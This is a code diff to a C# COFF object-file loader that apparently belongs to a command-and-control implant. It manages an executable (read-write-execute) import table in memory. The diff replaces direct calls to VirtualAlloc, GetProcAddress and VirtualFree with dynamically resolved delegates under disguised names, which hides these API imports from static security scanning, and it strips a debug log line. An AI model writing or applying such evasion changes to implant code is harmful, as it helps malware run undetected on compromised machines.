@@ -1,4 +1,5 @@
 ﻿#define _AMD64
+using Athena.Commands;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -11,13 +12,19 @@ namespace coff.coff
     class IAT
     {
         private readonly IntPtr iat_addr;
+        private DynamicHandler.DynamicVirtAllc dlgVirtAlloc = (DynamicHandler.DynamicVirtAllc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.VirtAllc, typeof(DynamicHandler.DynamicVirtAllc));
+        private DynamicHandler.DynamicGetThatAddress dlgGetProcAddr = (DynamicHandler.DynamicGetThatAddress)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.GetProcAddr, typeof(DynamicHandler.DynamicGetThatAddress));
+        private DynamicHandler.DynamicVirtForFree dlgVirtFree = (DynamicHandler.DynamicVirtForFree)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.VirtForFree, typeof(DynamicHandler.DynamicVirtForFree));
+
+
+
         private int iat_pages;
         private int iat_count;
         private readonly Dictionary<String, IntPtr> iat_entries;
         public IAT()
         {
             this.iat_pages = 2;
-            this.iat_addr = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)(this.iat_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
+            this.iat_addr = dlgVirtAlloc(IntPtr.Zero, (uint)(this.iat_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
             this.iat_count = 0;
             this.iat_entries = new Dictionary<string, IntPtr>();
         }
@@ -29,7 +36,7 @@ namespace coff.coff
             {
                 //Logger.Debug($"Resolving {func_name} from {dll_name}");
                 IntPtr dll_handle = NativeDeclarations.LoadLibrary(dll_name);
-                IntPtr func_ptr = NativeDeclarations.GetProcAddress(dll_handle, func_name);
+                IntPtr func_ptr = dlgGetProcAddr(dll_handle, func_name);
                 if (func_ptr == null || func_ptr.ToInt64() == 0)
                 {
                     throw new Exception($"Unable to resolve {func_name} from {dll_name}");
@@ -60,8 +67,6 @@ namespace coff.coff
 
 
 #elif _AMD64
-            //Logger.Debug($"Adding {dll_name + "$" + func_name} at address {func_address.ToInt64():X} to IAT address {this.iat_addr.ToInt64() + (this.iat_count * 8):X}");
-
 
             // check we have space in our IAT table
             if (this.iat_count * 8 > (this.iat_pages * Environment.SystemPageSize))
@@ -103,7 +108,7 @@ namespace coff.coff
             NativeDeclarations.ZeroMemory(this.iat_addr, this.iat_pages * Environment.SystemPageSize);
 
             // free it
-            NativeDeclarations.VirtualFree(this.iat_addr, 0, NativeDeclarations.MEM_RELEASE);
+            dlgVirtFree(this.iat_addr, 0, NativeDeclarations.MEM_RELEASE);
         }
     }
 }
